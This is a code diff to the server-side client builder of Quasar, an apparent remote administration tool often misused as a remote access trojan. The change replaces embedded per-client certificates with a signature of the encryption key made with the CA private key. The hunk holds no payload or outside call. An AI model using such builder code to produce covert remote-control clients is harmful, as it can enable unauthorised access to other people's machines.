@@ -2,12 +2,11 @@
 using Mono.Cecil.Cil;
 using Quasar.Common.Cryptography;
 using Quasar.Common.Helpers;
-using System;
-using System.IO;
-using System.Security.Cryptography.X509Certificates;
-using System.Windows.Forms;
-using Quasar.Server.Helper;
 using Quasar.Server.Models;
+using System;
+using System.Security.Cryptography;
+using System.Security.Cryptography.X509Certificates;
+using System.Text;
 using Vestris.ResourceLib;
 
 namespace Quasar.Server.Build
@@ -86,8 +85,14 @@ namespace Quasar.Server.Build
             var aes = new Aes256(key);
 
             var caCertificate = new X509Certificate2(Settings.CertificatePath, "", X509KeyStorageFlags.Exportable);
-            var clientCertificate = CertificateHelper.CreateCertificate("Quasar Client", caCertificate, 4096);
             var serverCertificate = new X509Certificate2(caCertificate.Export(X509ContentType.Cert)); // export without private key, very important!
+
+            byte[] signature;
+            using (var csp = (RSACryptoServiceProvider) caCertificate.PrivateKey)
+            {
+                var hash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(key));
+                signature = csp.SignHash(hash, CryptoConfig.MapNameToOID("SHA256"));
+            }
 
             foreach (var typeDef in asmDef.Modules[0].Types)
             {
@@ -132,8 +137,8 @@ namespace Quasar.Server.Build
                                         case 9: //LogDirectoryName
                                             methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.LogDirectoryName);
                                             break;
-                                        case 10: //ClientCertificate
-                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(clientCertificate.Export(X509ContentType.Pkcs12)));
+                                        case 10: //ServerSignature
+                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(signature));
                                             break;
                                         case 11: //ServerCertificate
                                             methodDef.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(serverCertificate.Export(X509ContentType.Cert)));
